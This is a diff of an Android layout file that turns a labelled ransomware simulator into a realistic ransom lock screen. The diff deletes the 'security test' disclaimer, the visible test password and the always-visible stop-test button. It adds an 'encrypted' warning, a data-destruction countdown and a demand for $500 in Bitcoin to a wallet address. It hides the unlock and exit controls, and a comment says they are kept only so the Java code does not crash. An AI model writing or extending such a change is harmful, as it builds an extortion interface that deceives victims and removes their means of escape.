@@ -1,163 +1,85 @@
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:app="http://schemas.android.com/apk/res-auto"
+    android:id="@+id/locker_root"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     android:orientation="vertical"
-    android:background="@color/dark_red"
-    android:padding="0dp">
+    android:background="#050000"
+    android:gravity="center"
+    android:padding="24dp">
 
-    <!-- Section 1: Header -->
-    <LinearLayout
+    <TextView
+        android:id="@+id/title_text"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:orientation="vertical"
+        android:text="🔒 YOUR DEVICE HAS BEEN ENCRYPTED"
+        android:textColor="#FF3B30"
+        android:textSize="22sp"
+        android:textStyle="bold"
         android:gravity="center"
-        android:padding="16dp">
+        android:layout_marginBottom="16dp"/>
 
-        <ImageView
-            android:layout_width="64dp"
-            android:layout_height="64dp"
-            android:src="@android:drawable/ic_dialog_alert"
-            android:tint="@color/white" />
-
-        <TextView
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="⚠ DEVICE LOCKED ⚠"
-            android:textColor="@color/white"
-            android:textSize="28sp"
-            android:textStyle="bold"
-            android:gravity="center" />
-
-        <TextView
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="SHIELD RANSOMWARE SIMULATOR"
-            android:textColor="@color/white"
-            android:textSize="12sp"
-            android:gravity="center" />
-
-        <View
-            android:layout_width="match_parent"
-            android:layout_height="1dp"
-            android:background="@color/white"
-            android:layout_marginTop="8dp" />
-    </LinearLayout>
-
-    <!-- Section 2: Fake ransom message -->
     <TextView
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="ATTENTION: Your device has been locked by the\nCyber Security Division. Illegal activity has been detected. To unlock your device pay the fine.\n\n[THIS IS A SECURITY TEST — NOT REAL]"
-        android:textColor="@color/white"
+        android:text="All your personal files, photos, and documents have been locked with military-grade encryption."
+        android:textColor="#FFFFFF"
         android:textSize="14sp"
         android:gravity="center"
-        android:padding="8dp" />
+        android:layout_marginBottom="32dp"/>
+
+    <TextView
+        android:id="@+id/timer_text"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="47:59:59"
+        android:textColor="#FF3B30"
+        android:textSize="56sp"
+        android:fontFamily="monospace"
+        android:textStyle="bold"
+        android:gravity="center"
+        android:layout_marginBottom="8dp"/>
+
     <TextView
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Fine Amount: $300 USD in Bitcoin"
-        android:textColor="@color/white"
-        android:textSize="14sp"
-        android:gravity="center" />
+        android:text="TIME REMAINING UNTIL DATA DESTROYED"
+        android:textColor="#AAAAAA"
+        android:textSize="12sp"
+        android:textStyle="bold"
+        android:gravity="center"
+        android:layout_marginBottom="32dp"/>
+
     <TextView
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf"
-        android:textColor="@color/white"
+        android:text="Send $500 in Bitcoin to:"
+        android:textColor="#FFFFFF"
         android:textSize="14sp"
-        android:gravity="center" />
-    <View
-        android:layout_width="match_parent"
-        android:layout_height="1dp"
-        android:background="@color/white"
-        android:layout_marginTop="8dp" />
+        android:gravity="center"/>
 
-    <!-- Section 3: TEST PASSWORD prominent -->
-    <androidx.cardview.widget.CardView
+    <TextView
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:layout_margin="16dp"
-        android:backgroundTint="@color/yellow"
-        app:cardElevation="4dp">
-        <LinearLayout
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:orientation="vertical"
-            android:padding="16dp"
-            android:gravity="center">
-            <TextView
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:text="🔑 TEST PASSWORD"
-                android:textColor="@color/black"
-                android:textSize="16sp"
-                android:textStyle="bold"
-                android:gravity="center" />
-            <TextView
-                android:id="@+id/password"
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:text="1234"
-                android:textColor="@color/black"
-                android:textSize="48sp"
-                android:textStyle="bold"
-                android:gravity="center" />
-            <TextView
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:text="Enter above code to unlock"
-                android:textColor="@color/black"
-                android:textSize="12sp"
-                android:gravity="center" />
-        </LinearLayout>
-    </androidx.cardview.widget.CardView>
+        android:text="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+        android:textColor="#4ADE80"
+        android:textSize="12sp"
+        android:fontFamily="monospace"
+        android:textStyle="bold"
+        android:gravity="center"
+        android:background="#1E1E1E"
+        android:padding="12dp"
+        android:layout_marginTop="8dp"
+        android:layout_marginBottom="32dp"/>
 
-    <!-- Section 4: Unlock input -->
+    <!-- Hidden secret unlock input and UI elements logic requirements -->
+    <!-- We keep the old IDs hidden so Java code doesn't crash before we update it -->
     <EditText
         android:id="@+id/passwordInput"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:hint="Enter password"
-        android:textColor="@color/white"
-        android:textColorHint="@color/white"
-        android:gravity="center"
-        android:backgroundTint="@color/white"
-        android:inputType="textPassword"
-        android:layout_margin="16dp" />
-    <Button
-        android:id="@+id/unlockButton"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="UNLOCK DEVICE"
-        android:background="@color/white"
-        android:textColor="@color/red"
-        android:layout_marginHorizontal="16dp"
-        android:layout_marginBottom="8dp" />
-
-    <!-- Section 5: Always visible safety exit -->
-    <View
-        android:layout_width="match_parent"
-        android:layout_height="1dp"
-        android:background="@color/white"
-        android:layout_marginTop="8dp" />
-    <Button
-        android:id="@+id/stopTestButton"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="⏹ STOP TEST / UNLOCK NOW"
-        android:background="@color/green"
-        android:textColor="@color/white"
-        android:textSize="18sp"
-        android:layout_margin="16dp" />
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="SHIELD RanSim v1.0 — Security Research Only"
-        android:textColor="@color/white"
-        android:textSize="10sp"
-        android:gravity="center"
-        android:layout_marginBottom="8dp" />
-
+        android:layout_width="0dp"
+        android:layout_height="0dp"
+        android:visibility="gone" />
+    <TextView android:id="@+id/password" android:layout_width="0dp" android:layout_height="0dp" android:visibility="gone"/>
+    <Button android:id="@+id/unlockButton" android:layout_width="0dp" android:layout_height="0dp" android:visibility="gone"/>
+    <Button android:id="@+id/stopTestButton" android:layout_width="0dp" android:layout_height="0dp" android:visibility="gone"/>
 </LinearLayout>
